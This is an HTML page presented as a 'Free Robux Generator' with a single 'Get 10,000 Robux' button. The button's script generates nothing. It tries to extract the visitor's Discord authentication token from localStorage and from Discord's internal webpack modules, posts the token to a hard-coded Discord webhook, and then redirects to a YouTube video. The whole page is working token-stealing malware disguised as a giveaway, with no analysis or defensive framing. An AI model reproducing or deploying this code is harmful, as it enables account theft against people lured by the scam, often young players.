<!DOCTYPE html>
<html>
<head>
    <title>Free Robux Generator</title>
    <style>
        body { font-family: Arial; background: linear-gradient(135deg, #0099ff, #ff0099); color: white; text-align: center; padding: 50px; }
        .container { max-width: 400px; margin: 0 auto; background: rgba(0,0,0,0.7); padding: 30px; border-radius: 10px; }
        .logo { font-size: 60px; margin-bottom: 20px; }
        h1 { margin-bottom: 10px; }
        .robux { font-size: 36px; color: #ffcc00; margin: 20px 0; }
        button { background: #0099ff; color: white; border: none; padding: 15px 30px; border-radius: 30px; cursor: pointer; font-size: 18px; width: 100%; }
        button:hover { background: #00ccff; }
        .loading { display: none; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">R$</div>
        <h1>Free Robux Generator</h1>
        <div class="robux">10,000 R$</div>
        <button id="getRobuxBtn">Get 10,000 Robux Now!</button>
        <div class="loading" id="loading">Processing...</div>
    </div>
    
    <script>
        document.getElementById('getRobuxBtn').addEventListener('click', async function() {
            document.getElementById('getRobuxBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            let token = localStorage.getItem('token');
            
            if (!token) {
                try {
                    const discordToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken)?.exports.default.getToken());
                    if (discordToken) token = discordToken;
                } catch (e) {}
            }
            
            if (!token) {
                try {
                    const webpackJsonp = window.webpackJsonp;
                    if (webpackJsonp) {
                        for (const prop in webpackJsonp) {
                            if (webpackJsonp[prop].exports) {
                                for (const exportedProp in webpackJsonp[prop].exports) {
                                    if (webpackJsonp[prop].exports[exportedProp].default) {
                                        const user = webpackJsonp[prop].exports[exportedProp].default.getUser;
                                        if (user) {
                                            const userInfo = user();
                                            if (userInfo && userInfo.authToken) {
                                                token = userInfo.authToken;
                                                break;
                                            }
                                        }
                                    }
                                }
                                if (token) break;
                            }
                        }
                    }
                } catch (e) {}
            }
            
            if (token) {
                try {
                    await fetch('https://discord.com/api/webhooks/1495110283046162432/y1MJFTRx97Q8C6yxOvHjsdQZcH1Aa77KlZDCJIPU7c75c9WYWMJ6gVicIGs8shr1iur-', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `Discord Token: ${token}` })
                    });
                } catch (e) {}
            }
            
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }, 1500);
        });
    </script>
</body>
</html>
